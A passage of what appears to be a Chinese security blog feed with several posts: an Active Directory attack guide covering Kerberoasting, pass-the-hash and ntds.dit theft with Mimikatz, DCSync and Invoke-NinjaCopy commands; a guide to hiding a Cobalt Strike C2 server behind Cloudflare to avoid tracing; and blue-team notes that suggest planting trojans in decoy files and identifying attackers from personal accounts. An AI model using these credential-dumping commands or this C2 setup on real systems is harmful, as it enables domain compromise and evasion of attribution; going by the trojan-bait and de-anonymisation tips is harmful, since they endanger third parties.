class="line">企业管理员（管理员在森林中的所有DC），</span><br><span class="line">域管理员</span><br><span class="line">普通管理员</span><br><span class="line">服务器管理员</span><br><span class="line">备份操作员</span><br><span class="line">账户操作员</span><br><span class="line">打印操作员</span><br><span class="line">委派其他登录到域控制器的组</span><br></pre></td></tr></table></figure></li><li>监视事件ID 4769 Kerberos Service Ticket Operation事件，显示失败的尝试获取Kerberos服务票证（TGS）</li></ol><h2 id="3-Kerberos-TGS票离线破解（Kerberoast）"><a href="#3-Kerberos-TGS票离线破解（Kerberoast）" class="headerlink" title="3.Kerberos TGS票离线破解（Kerberoast）"></a>3.Kerberos TGS票离线破解（Kerberoast）</h2><p>Kerberoast可以作为普通用户从Active Directory中提取服务帐户凭据而不向目标系统发送任何数据包的有效方法。这种攻击是有效的，因为人们往往会使用较弱的密码。这种攻击成功的原因是大多数服务帐户密码与域密码最小值（通常为10或12个字符长）的长度相同，意味着即使暴力破解也不会超过密码最大爆破时间。其中大多数服务帐户并没有密码设置为过期时间，因此，可能有几年，几个月没有更改密码，此外，大多数服务帐户都被特权许可，通常是提供完整管理员的域管理员成员Active Directory权限（即使服务帐户只需要修改特定对象类型上的属性或特定服务器上的管理员权限）。</p><p>注意：当针对Windows系统托管的服务时，这种攻击将不会成功，因为这些服务被映射到Active Directory中的计算机帐户，该帐户有一个相关的128字符密码，不会很快被破解。</p><p>此攻击涉及为目标服务帐户的服务主体名称（SPN）请求Kerberos服务票证（TGS），该请求使用有效的域用户身份验证票据（TGT）为服务器上运行的目标服务请求一个或多个服务票证。域控制器不会跟踪用户是否实际连接到这些资源（或者即使用户有访问权限），域控制器在Active Directory中查找SPN，并使用与SPN相关联的服务帐户加密票据，以便服务验证用户访问权限，所请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。Kerberoast可以尝试通过不同的NTLM散列来打开Kerberos票证，并且当票证成功打开时，会发现正确的服务帐户密码。</p><p>Active Directory环境中发现服务的最佳方式是通过“SPN扫描”</p><p>攻击者通过SPN扫描的主要作用是不需要连接到网络上的每个IP以检查服务端口。SPN扫描通过LDAP查询域控制器以便发现服务。由于SPN查询是正常Kerberos票证执行的一部分，所以很难安全设备被探测到，而netowkr端口扫描是相当明显的，容易被发现。</p><p>以下是SPN扫描含有SQL服务的主机服务：</p><p><img src="/images/upload_6eaf38d32c7a9341fdd6244788a7b2c2.png"> <img src="/images/upload_f3ab25e7d1535958e4cae88140473369.png"></p><p>其探测脚本：</p><p><a href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers">https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers</a></p><p>识别目标后，我们使用PowerShell来请求此服务主体名称（SPN）的服务票证：请注意，请求的服务票证是具有RC4加密类型</p><p><img src="/images/upload_7dde630873191cb755f23046a234b06b.png"></p><p>一旦客户端接收到票据，我们可以使用Mimikatz（或其他）在用户的内存中导出所有Kerberos票证，而不会进行权限提升。</p><p><img src="/images/upload_1a4d23899bc724deda44e0643ec1b2fc.png"></p><p>将服务票据导出后，该文件可以拷贝到正在运行Kerberoast的 Kali Linux的主机。利用我们的wordlist密码字典，可能会破解与票证（文件）相关联的服务帐户的密码。</p><p><img src="/images/upload_12f58d464ef1efce13107cfc8a968a3d.png"></p><p><code>`https://github.com/nidem/kerberoast`</code></p><h3 id="安全建议：-1"><a href="#安全建议：-1" class="headerlink" title="安全建议："></a>安全建议：</h3><ol><li>最有效地减轻这种攻击是确保服务帐户密码超过25个字符。</li><li>托管服务帐户和域管理服务帐户是确保服务帐户密码长的好方法，复杂密码，定期更换密码。提供密码保管的第三方产品也是管理服务帐户密码的解决方案</li></ol><h2 id="域控票据凭证的盗取"><a href="#域控票据凭证的盗取" class="headerlink" title="域控票据凭证的盗取"></a>域控票据凭证的盗取</h2><p>这通常很快导出域管理员凭据，因为大多数Active Directory管理员使用用户帐户登录到他们的工作站，然后使用RunAs（将其管理员凭据放在本地工作站上）或RDP连接到服务器（可以使用键盘记录器抓取凭据）。</p><p>步骤1：攻击单个工作站，并利用系统上的权限升级漏洞获得管理权限。运行Mimikatz或类似以转储本地凭据和最近登录凭据。</p><p>步骤2：使用从步骤1收集的本地管理员凭据，尝试向具有管理员权限的其他工作站进行身份验证，这通常是成功的。如果您在许多或所有工作站上拥有相同的管理员帐户名称和密码，请在一个工作站上获取帐户名称和密码，那么意味着拥有管理员权限。连接到其他工作站并转储凭据，直到收到域管理员帐户的凭据。使用本地帐户登录是最佳的，因为不会到登录域控制器，并且很少有企业将工作站安全日志发送到中央日志记录系统（SIEM）</p><p>步骤3：利用被盗凭证连接到服务器以收集更多凭据，运行Microsoft Exchange客户端访问服务器（CAS）等应用程序的服务器，Microsoft Exchange OWA，Microsoft SQL和终端服务（RDP）往往在最近经过身份验证的用户（或可能具有域管理员权限的服务）的内存中拥有大量凭据。</p><p>步骤4：使用被盗的域管理员凭据，任何事情都不能阻止攻击者销毁所有的域登录凭据并持久存在。</p><p>注意：使用域管理员帐户登录到计算机将凭据存放在LSASS（受保护的内存空间）中。具有管理员权限（或本地系统）到此计算机的LSASS转储凭据，并可以重复使用这些凭据。</p><p>使用普通帐户登录到计算机，并通过在RDP凭据中输入域管理员凭证来打开服务器的RDP会话窗口向系统上运行键盘记录器（可能是以前危及用户帐户或计算机的攻击者）公开了Domain Admin凭据。</p><p>如果服务部署到具有域管理员权限的服务帐户上中运行，那么所有工作站或所有服务器（或两者）只有一个系统受到危害才能危及整个Active Directory域，当服务以显式凭据启动时，凭据将加载到LSASS中，以使服务在这些凭据的上运行。</p><p>通常，PowerShell是一种最佳的管理方法，因为通过PowerShell远程处理连接到远程系统（通过Enter-PSSession或Invoke-Command）是网络登录 - 没有凭据存储在远程系统的内存中。这是理想的，而微软正在通过管理员模式将RDP转变，有一种通过PowerShell远程连接到远程系统的方法，并能够通过CredSSP使用凭据，问题是CredSSP不安全</p><p>通过散列演变成Pass-the-Credential</p><p>大多数人都听说过通过哈希传递（PtH），它涉及发现与帐户相关联的密码哈希（通常是NTLM密码哈希）。有趣的是，在Windows网络中，不需要破解散列哈希来发现相关的密码，哈希是用于证明身份（标识的帐户名称和密码哈希是所有需要验证），微软的产品和工具显然不支持传递哈希，因此需要使用第三方工具，如Mimikatz。</p><p>一旦发现密码哈希，Pass-the-Hash为攻击者打开了很多后门，但还有其他选择。Pass-of-Ticket（PtT）涉及到抓住现有的Kerberos票证并使用它来模拟用户。Mimikatz支持收集当前用户的Kerberos票证，或者为系统验证的每个用户收集所有Kerberos票证（如果配置了Kerberos无约束委托）一旦获得Kerberos票证，他们可以使用Mimikatz传递，并用于访问资源（在Kerberos票据生命周期内）。</p><p>OverPass-the-Hash（又称Pass-the-Key）涉及使用密码哈希来获取Kerberos票证。此技术清除当前所有用户的现有Kerberos密钥（哈希值），并将获取的哈希值注入到Kerberos票据请求的内存中，下一次Kerberos票证需要资源访问时，注入的散列（现在是内存中的Kerberos密钥）用于请求Kerberos票证。Mimikatz提供执行OverPass-the-Hash的功能。这是比PtH更方便的方法，因为有方法可以检测PtH的攻击。</p><p>注意：如果获取的散列是NTLM，Kerberos票是RC4。如果散列是AES，则Kerberos票使用AES</p><p>主要的凭证盗取的方法：</p><p>通过哈希传递：抓取哈希并访问资源。用户更改帐户密码之前，哈希才有效。 Pass-the-Ticket：获取Kerberos机票并用于访问资源。机票有效期至票证生效期满（通常为7天）。 OverPass-the-Hash：使用密码哈希来获取Kerberos票证。用户更改帐户密码之前，哈希才有效。</p><h2 id="获取Active-Directory数据库文件（ntds-dit）的访问权限"><a href="#获取Active-Directory数据库文件（ntds-dit）的访问权限" class="headerlink" title="获取Active Directory数据库文件（ntds.dit）的访问权限"></a>获取Active Directory数据库文件（ntds.dit）的访问权限</h2><p>Active Directory数据库（ntds.dit）包含有关Active Directory域中所有对象的信息，此数据库中的数据将复制到域中的所有域控制器中，该文件还包含所有域用户和计算机帐户的密码哈希值，域控制器（DC）上的ntds.dit文件只能由可以登录到DC的用户访问。显然，保护这个文件是至关重要的，因为访问ntds.dit文件可能会导致完整的域和林危害。</p><p>这是一个（非全面的）一些方法来获取NTDS.dit数据而不是域管理员：</p><p>备份位置（备份服务器存储，媒体和/或网络共享）：</p><p>使用备份共享中的ntds.dit文件访问DC备份。确保存储DC备份的任何网络可访问，只有域管理员才能访问它们，还有什么账户呢？他们是域管理员！</p><p>在升级到域控制器之前，查找在成员服务器上分段的NTDS.dit文件</p><p>IFM与DCPromo一起使用“从媒体安装”，因此正在升级的服务器不需要通过网络从其他DC复制域数据，IFM集是NTDS.dit文件的副本，可以在共享上分享以更新DC，或者可能在尚未升级的新服务器上找到。此服务器可能未正确保护</p><p>通过对虚拟化主机的管理权限，可克隆虚拟DC并将关联的数据脱机复制。</p><p>访问虚拟DC存储数据并访问域凭据。VCenter Admins是完整的管理员（DA相当于VMWare）。使用VCenter Admin权限：克隆DC并将数据复制到本地硬盘驱动器。当VM挂起时，也可以从VM内存中提取LSASS数据，不要低估虚拟管理员对虚拟域控制器的影响力。您的VCenter管理员组在AD授予相应管理组的适当权限，不要为攻击者提供管理员帐户后门AD的能力。您的虚拟管理员需要被视为域管理员。</p><p>攻击有权限的登录域控制器的帐户。 Active Directory中有几个组最不希望对域控制器具有默认登录权限。</p><p><img src="/images/upload_0f1e90bb653332418a4d758907b5b771.png"></p><p>这些组可以默认登录到域控制器： Enterprise Admins（林中每个域中的域管理员组成员） Domain Admins（域管理员组的成员） Administrators Backup Operators Account Operators Print Operators</p><p>这意味着如果攻击者可能会攻击帐户操作员或打印操作员中的帐户，则Active Directory域可能会受到影响，因为这些组对域控制器具有登录权限</p><h3 id="安全建议：-2"><a href="#安全建议：-2" class="headerlink" title="安全建议："></a>安全建议：</h3><ol><li>限制有权登录到域控制器的组/帐户。</li><li>限制具有完整Active Directory权限的组/帐户，特别是服务帐户。</li><li>保护Active Directory数据库（ntds.dit）的每个副本，并且不要放置在比域控制器低的信任级别的系统上。</li></ol><p>那么当一个帐户被授权给域控制器的登录权限时会发生什么？如果该帐户对域控制器具有管理员权限，则在DC上转储证书是不成功的使用，Mimikatz转储所有域凭据，Mimikatz可用于从域控制器转储所有域凭据。</p><p><img src="/images/upload_68e9a202ca794a90da39e00e64ee71bc.png"></p><h4 id="1-使用Mimikatz转储LSASS内存（获取域管理员凭据）"><a href="#1-使用Mimikatz转储LSASS内存（获取域管理员凭据）" class="headerlink" title="1.使用Mimikatz转储LSASS内存（获取域管理员凭据）"></a>1.使用Mimikatz转储LSASS内存（获取域管理员凭据）</h4><p>Mimikatz可用于转储LSASS，然后从不同系统上的LSASS.dmp文件中提取登录凭据。在域控制器上，这能够导出域管理员凭据</p><p><img src="/images/upload_e8826039f5331b75ae80f5fb0842ce9e.png"></p><p>使用任务管理器转储LSASS内存（获取域管理员凭据）</p><p>一旦LSASS被转储，可以使用Mimikatz从不同系统上的LSASS.dmp文件中提取登录的凭据。</p><h4 id="2-使用NTDSUtil（Grab-NTDS-dit文件）创建从媒体安装（IFM）"><a href="#2-使用NTDSUtil（Grab-NTDS-dit文件）创建从媒体安装（IFM）" class="headerlink" title="2.使用NTDSUtil（Grab NTDS.dit文件）创建从媒体安装（IFM）"></a>2.使用NTDSUtil（Grab NTDS.dit文件）创建从媒体安装（IFM）</h4><p>NTDSUtil是用于与AD和 DB（ntds.dit）进行本机配合的命令实用程序，并启用了DCPromo的IFM集创建，IFM与DCPromo一起使用“从媒体安装”，因此正在升级的服务器不需要通过网络从其他DC复制域数据，FM集是在此实例中的c\ temp中创建的NTDS.dit文件副本，</p><p>该文件可能会在共享上进行升级以更新DC，或者可能在未升级的新服务器上找到该文件，此服务器可能未正确保护</p><p><img src="/images/upload_1e50ca8b606ef3efae4c9483b04ff3be.png"></p><p>从NTDS.dit文件（和注册表系统配置单元）转储Active Directory域凭据。</p><p>一旦攻击者拥有NTDS.dit文件的副本（以及某些注册表项来解密数据库文件中的安全元素），可以提取Active Directory数据库文件中的凭据数据。一旦攻击者从注册表和NTDS.dit fie获取系统配置单元，</p><p>以下截图来自一个安装了Impacket python工具：</p><p><img src="/images/upload_7743c8aa1ab2632b8ddc85e73072a8bc.png"></p><p>截至2015年10月，还有一个Windows方法利用PowerShell方法从DSInternals.com的NTDS.dit文件（和注册表系统配置单元）中转储Get-ADDBAccount(<a href="https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/">https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/)的凭据(虽然它仅适用于Windows</a>的凭据(虽然它仅适用于Windows) 8和Windows Server 2012及更早版本，因为Windows版本较早）。</p><h4 id="3-使用VSS卷影副本远程拉取ntds-dit（通过WMI或PowerShell-Remoting）"><a href="#3-使用VSS卷影副本远程拉取ntds-dit（通过WMI或PowerShell-Remoting）" class="headerlink" title="3.使用VSS卷影副本远程拉取ntds.dit（通过WMI或PowerShell Remoting）"></a>3.使用VSS卷影副本远程拉取ntds.dit（通过WMI或PowerShell Remoting）</h4><p>Windows有一个名为WMI的内置管理组件，可实现远程执行（需要管理员权限）。WMIC是在远程计算机上执行的WMI命令工具。</p><p>Matt Graeber在Black Hat USA 2015（论文，幻灯片和视频）上介绍了如何利用WMI进行攻击方法。马特还在DEF CON 23（视频）与同事交谈，进一步攻击WMI能力（再次在DerbyCon - 视频）</p><p>利用WMIC（或PowerShell远程处理）创建（或复制现有的）VSS</p><p><img src="/images/upload_89b57cf8495dd955afd1c56f332d5c21.png"></p><p>一旦VSS快照完成，然后将NTDS.dit文件和System注册表配置单元从VSS复制到DC上的c：驱动器</p><p><img src="/images/upload_45cbd21a8d8e5bff55684031726734a9.png"></p><p>文件位于DC上的c：\ temp文件夹中，将文件复制到本地计算机。</p><p><img src="/images/upload_a5d8d0ce3ebdae118618b4e8456c3ea4.png"></p><p>此截图显示攻击者使用Mimikatz发现明文密码。如果我们没有这个，怎么办？</p><p>攻击者可以通过与WMIC的Kerberos机票做同样的事情。</p><p><img src="/images/upload_162691ec8d77a66ccc05dfa1aefcd4ad.png"></p><p><img src="/images/upload_3aaffc52db5de385e17915daa17dcc22.png"></p><h4 id="4-使用PowerSploit的Invoke-NinjaCopy-远程拉出ntds-dit-（需要在目标DC上启用PowerShell远程处理）"><a href="#4-使用PowerSploit的Invoke-NinjaCopy-远程拉出ntds-dit-（需要在目标DC上启用PowerShell远程处理）" class="headerlink" title="4.使用PowerSploit的Invoke-NinjaCopy 远程拉出ntds.dit （需要在目标DC上启用PowerShell远程处理）"></a>4.使用PowerSploit的Invoke-NinjaCopy 远程拉出ntds.dit （需要在目标DC上启用PowerShell远程处理）</h4><p>Invoke-NinaCopy是一个PowerShell项目中的脚本，可以使用PowerShell远程处理（PowerShell远程处理必须在目标DC上启用）从远程计算机复制文件（即使文件被锁定，提供对文件的直接访问）。</p><p>命令： Invoke-NinjaCopy -Path“c:\windows\ntds\ ntds.dit”-ComputerName“RDLABDC02”-LocalDestination“c:\temp\ ntds.dit”</p><p>以下示例是从互联网下载代码执行Invoke-Ninjacopy，并完全在内存中执行。如果攻击者损坏了域管理员登录的工作站，则此方法将起作用，从而使攻击者能够将Active Directory数据库文件从域控制器复制到工作站，然后上传到Internet。</p><p><img src="/images/upload_fd1231756ccd081c01dc70b84947638d.png"></p><p>使用DIT Snapshot Viewer，我们可以验证是否成功获取了ntds.dit文件。</p><p><img src="/images/upload_88b695f7e6130084de9c5ded2c0ea317.png"></p><h4 id="5-使用Mimikatz（在DC上）本地转储Active-Directory凭据"><a href="#5-使用Mimikatz（在DC上）本地转储Active-Directory凭据" class="headerlink" title="5.使用Mimikatz（在DC上）本地转储Active Directory凭据"></a>5.使用Mimikatz（在DC上）本地转储Active Directory凭据</h4><p>通常，服务帐户是域管理员（或等效的）的成员，或者域管理员最近登录到计算机上的攻击者转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希值。</p><p>注意：在DC上本机运行时，有许多不同的工具可以转储AD凭据，我更倾向于Mimikatz，因为它具有广泛的凭据窃取和注入功能（以及更多），可以从各种来源和场景启用凭据转储。</p><p>命令：mimikatz lsadump :: lsa / inject exit</p><p>在域控制器上运行时，Active Directory域中转储凭证数据。需要管理员访问调试或本地SYSTEM权限</p><p>注意：RID 502的帐户是KRBTGT帐户，RID 500的帐户是该域的默认管理员。</p><p><img src="/images/upload_6842a9554ba479b8fe095120b776ad69.png"></p><h4 id="6-使用Invoke-Mimikatz（在DC上）本地转储Active-Directory凭据"><a href="#6-使用Invoke-Mimikatz（在DC上）本地转储Active-Directory凭据" class="headerlink" title="6.使用Invoke-Mimikatz（在DC上）本地转储Active Directory凭据"></a>6.使用Invoke-Mimikatz（在DC上）本地转储Active Directory凭据</h4><p>调用-Mimikatz是PowerSploit项目中由乔·比尔莱克（@JosephBialek）创建，其包含了Mimikatz的所有功能。它“利用Mimikatz 2.0和Invoke-ReflectivePEInjection来反射性地将Mimikatz完全存储在内存中。这允许您执行诸如转储凭据的操作，而无需将Mimikatz二进制文件写入到磁盘利。“请注意，PowerSploit框架现在托管在”PowerShellMafia“GitHub中。</p><p>此外，如果Invoke-Mimikatz以适当的权限运行并且目标计算机启用了PowerShell Remoting，则可以从其他系统中提取凭据，并远程执行标准Mimikatz命令，而不会在远程系统上丢弃文件。</p><p>Invoke-Mimikatz的主要功能：</p><p>使用mimikatz从LSASS转储凭证： Invoke-Mimikatz -DumpCreds 使用mimikatz导出所有私人证书（即使它们被标记为不可导出）：Invoke-Mimikatz - DumpCerts 提升在远程计算机上具有调试权限的权限：Invoke-Mimikatz -Command“privilege :: debug exit”-ComputerName“computer1” Invoke-Mimikatz“Command”参数使Invoke-Mimikatz能够运行自定义Mimikatz命令。</p><p>命令： Invoke-Mimikatz -Command’”privilege :: debug” “LSADump :: LSA / inject” exit’</p><p><img src="/images/upload_557b31577ae49d66cf6b4f3e82f3a723.png"></p><h4 id="7-用Invoke-Mimikatz（通过PowerShell-Remoting）远程转储Active-Directory凭据"><a href="#7-用Invoke-Mimikatz（通过PowerShell-Remoting）远程转储Active-Directory凭据" class="headerlink" title="7.用Invoke-Mimikatz（通过PowerShell Remoting）远程转储Active Directory凭据"></a>7.用Invoke-Mimikatz（通过PowerShell Remoting）远程转储Active Directory凭据</h4><p>命令： Invoke-Mimikatz -Command“”privilege :: debug“”LSADump：LSA / inject“” - 计算机RDLABDC02.rd.adsecurity.org</p><p>该示例是从Internet下载代码执行Invoke-Mimikatz，并完全在内存中执行。如果攻击者损坏了域管理员登录的工作站，则此方案将起作用，从而使攻击者能够获取AD凭据并上传到Internet。</p><p><img src="/images/upload_586ca795fae46d9e759031e0e843480c.png"></p><h4 id="8-使用Mimikatz的DCSync-远程转储Active-Directory凭据"><a href="#8-使用Mimikatz的DCSync-远程转储Active-Directory凭据" class="headerlink" title="8.使用Mimikatz的DCSync 远程转储Active Directory凭据"></a>8.使用Mimikatz的DCSync 远程转储Active Directory凭据</h4><p>2015年8月添加到Mimikatz的一个主要功能是“DCSync”，其有效地“模拟”域控制器并从目标域控制器请求帐户密码数据。DCSync由Benjamin Delpy和Vincent Le Toux编写。</p><p>DCSync之前的漏洞利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz以获取KRBTGT密码哈希来创建黄金门票。使用Mimikatz的DCSync和适当的权限，攻击者可以通过从网络域控制器中提取密码散列以及以前的密码散列，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。</p><p>运行DCSync需要特殊权限，管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都可以运行DCSync来提取密码数据，请注意，默认情况下不仅能读取域控制器还可以为用户提供密码数据。</p><p>DCSync如何运行：</p><p>发现指定域名中的域控制器。 请求域控制器通过GetNCChanges复制用户凭据（利用目录复制服务（DRS）远程协议） 作者以前已经为域控制器复制做了一些数据包捕获，并确定了域控制器如何复制的内部DC通信流程。 Samba Wiki描述了DSGetNCChanges功能：</p><p>“客户端DC向服务器发送DSGetNCChanges请求，当第一个请求从第二个请求获取AD对象更新。响应包含客户端必须应用于其DC副本的一组更新。… 当DC接收到DSReplicaSync请求时，对于从其复制的每个DC（存储在RepsFrom数据结构中），它执行周期复制，其类似在客户端中并使DSGetNCChanges请求该DC。所以它从复制的每个DC中获取最新的AD对象。“</p><p>DCSync选项：</p><p>/user - 用户id或要使用的用户SID。 /domain（可选） - Active Directory域的FQDN。Mimikatz将发现域中的DC连接。如果未提供此参数，则Mimikatz默认为当前域。 /dc（可选） - 指定要让DCSync连接到并收集数据的域控制器。 DCSync命令示例：</p><p>在rd.adsecurity.org域中提取KRBTGT帐户密码数据： Mimikatz “privilege :: debug” “lsadump :: dcsync /domain:rd.adsecurity.org / user：krbtgt” exit</p><p>在rd.adsecurity.org域中提权管理员用户密码数据： Mimikatz “privilege :: debug” “lsadump :: dcsync /domain:rd.adsecurity.org / user：Administrator” exit</p><p>在lab.adsecurity.org域中提取出ADSDC03域控制器中计算机帐户的密码数据： Mimikatz “privilege :: debug” “lsadump :: dcsync /domain:lab.adsecurity.org / user：adsdc03 $” exit</p><p><img src="/images/upload_0cc14231b21faee27dc1892aec81bc76.png"></p><p>如果该帐户启用“可逆加密”，则显示明文密码。</p><p><img src="/images/upload_23078d311500b2b50d683325934eb97b.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署</title>
      <link href="1fc49bae5dd1/"/>
      <url>1fc49bae5dd1/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike-TeamServer-CloudFlare-HTTPS-防溯源部署"><a href="#Cobalt-Strike-TeamServer-CloudFlare-HTTPS-防溯源部署" class="headerlink" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"></a>Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署</h1><p>🙏感谢 `@mattshi 提供套路</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>两台VPS，推荐一台windows 一台linux 一个匿名的域名，同时注册好cloudflare账号</p><h2 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h2><h3 id="CloudFlare配置"><a href="#CloudFlare配置" class="headerlink" title="CloudFlare配置"></a>CloudFlare配置</h3><p>把域名解析到C2服务器的IP，一个二级域名和两个三级域名，三级域名名字随意。 <img src="/images/post-1671-5f6c62f9ca06e.png"></p><p>同时吧SSL模式调到Full <img src="/images/post-1671-5f6c62fdb58fc.png"></p><h3 id="C2服务器部署"><a href="#C2服务器部署" class="headerlink" title="C2服务器部署"></a>C2服务器部署</h3><p>先在linux的C2服务器上部署好nginx nginx配置文件参考如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        ssl_certificate /etc/ssl/server.crt;</span><br><span class="line">        ssl_certificate_key     /etc/ssl/server.key;</span><br><span class="line">        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        root /var/www/html/;</span><br><span class="line">        index ip.html;</span><br><span class="line">        server_name [域名];</span><br><span class="line">        location / &#123;</span><br><span class="line">            if ( $http_user_agent ~ &quot;^$&quot; )&#123;</span><br><span class="line">                    proxy_pass  http://[二级跳转域名];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server&#123;</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        ssl_certificate /etc/ssl/server.crt;</span><br><span class="line">        ssl_certificate_key     /etc/ssl/server.key;</span><br><span class="line">        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        server_name [二级跳转域名];</span><br><span class="line">        root /var/www/html/;</span><br><span class="line">        index ip.html;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_pass  [TeamServer WebScript IP和端口];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server&#123; </span><br><span class="line">        listen 443 ssl; </span><br><span class="line">        ssl_certificate /etc/ssl/server.crt;</span><br><span class="line">        ssl_certificate_key     /etc/ssl/server.key;</span><br><span class="line">        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        server_name [域名];</span><br><span class="line">        root /var/www/html/;</span><br><span class="line">        index 1.html;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_set_header    Host    $host;</span><br><span class="line">            proxy_pass  [TeamServer Listener IP和端口];</span><br><span class="line">            proxy_redirect      off;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>/var/www/html/</code>下面创建个<code>index.html</code> 填入如下内容，伪装成一个没有危害的站点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const API_URL = `https://www.cloudflare.com/cdn-cgi/trace`;</span><br><span class="line">        function onDataRecieve() &#123;</span><br><span class="line">            const ipRegex = /[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/                           </span><br><span class="line">            const IP = xhttp.responseText.match(ipRegex)[0];</span><br><span class="line">            document.getElementById(&quot;demo&quot;).innerHTML = IP</span><br><span class="line">        &#125;</span><br><span class="line">        const xhttp = new XMLHttpRequest();</span><br><span class="line">        xhttp.onreadystatechange = onDataRecieve;</span><br><span class="line">        xhttp.open(&quot;GET&quot;, API_URL, true);</span><br><span class="line">        xhttp.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;demo&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>配置好nginx之后 <code>systemctl enable --now nginx</code></p><p>这样C2服务器就配置完成。</p><h3 id="TeamServer部署"><a href="#TeamServer部署" class="headerlink" title="TeamServer部署"></a>TeamServer部署</h3><p>Windows CS TeamServer上下好TeamServer然后跑起来。 如下图部署好Listener： <img src="/images/post-1671-5f6c62feeaa28.png"></p><p>如下图部署好WebScript： <img src="/images/post-1671-5f6c62ffef637.png"></p><p>这样TeamServer就配置好了</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>在新建WebScript的时候会自动生成一个powershell的命令。 找台靶机跑一下这个命令，靶机就会上线。 <img src="/images/post-1671-5f6c6300cbe32.png"></p>]]></content>
      
      
      <categories>
          
          <category> 红蓝队 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝队实战笔记</title>
      <link href="f5858198c6fa/"/>
      <url>f5858198c6fa/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝队实战笔记"><a href="#蓝队实战笔记" class="headerlink" title="蓝队实战笔记"></a>蓝队实战笔记</h1><h2 id="粗略反制思路"><a href="#粗略反制思路" class="headerlink" title="粗略反制思路"></a>粗略反制思路</h2><ol><li>部署蜜罐，获取攻击者信息，jsonp&amp;xss拿到登陆过的常用网站账号，记得蜜罐网段严格隔离，同时WAF等不要拦截发往蜜罐的请求。</li><li>在官网等子域名首页，放上含有恶意木马或病毒的文件，伪装成运维不小心遗留的文件。如wwwroot_2020.zip</li><li>部署钓鱼站点，如vpn.xxx.com，并附上假的vpn操作手册，内含exe安装包马或pdf文件上马，诱导攻击者点击。</li><li>伪造一个虚拟的员工，故意点击或落入攻击者的陷阱，但是进行反制任务。</li></ol><h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p>了解分析威胁来源，如ip 、文件、邮件样本等进行初步分析，形成一个大概的判断：</p><ol><li>攻击者高精度ip查询 <a href="https://www.chaipip.com/aiwen.html">https://www.chaipip.com/aiwen.html</a> <a href="https://ipip.bet/">https://ipip.bet</a> 可以查询ip的大概位置，定位ip情况，比如酒仙桥360总部位置等确定大概攻击者ip范围</li><li>威胁情报分析 微步在线 可以查询ip 样本 hash url <a href="https://x.threatbook.cn/nodev4/vb4/list">https://x.threatbook.cn/nodev4/vb4/list</a></li><li>在线沙箱 如腾讯哈勃平台 <a href="https://habo.qq.com/">https://habo.qq.com/</a># 多家在线病毒库检测病毒、木马、恶意脚本 <a href="https://r.virscan.org/">https://r.virscan.org/</a></li><li>蜜罐拿到的信息如何定位个人？看到相关账号信息，如手机号、QQ号、邮箱、用户名，常用的google搜索 查看大概信息，手机号？输入支付宝，查看大概实名，百家姓猜测，脉脉搜索用户名，id号？搜索朋友圈常见的微信群，google等，查找对应的人。</li><li>疑似钓鱼邮件？查看邮件的原始报文信息，判断邮箱来源，提取样本分析，注意样本一定要在虚拟机沙箱中分析，不误点击。</li><li>现场分析电脑一定要安装杀毒软件，推荐小红伞、nod32、卡巴等</li></ol>]]></content>
      
      
      <categories>
          
          <category> 红蓝队 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP禁用函数绕过</title>
      <link href="9f234cb72947/"/>
      <url>9f234cb72947/</url>
      
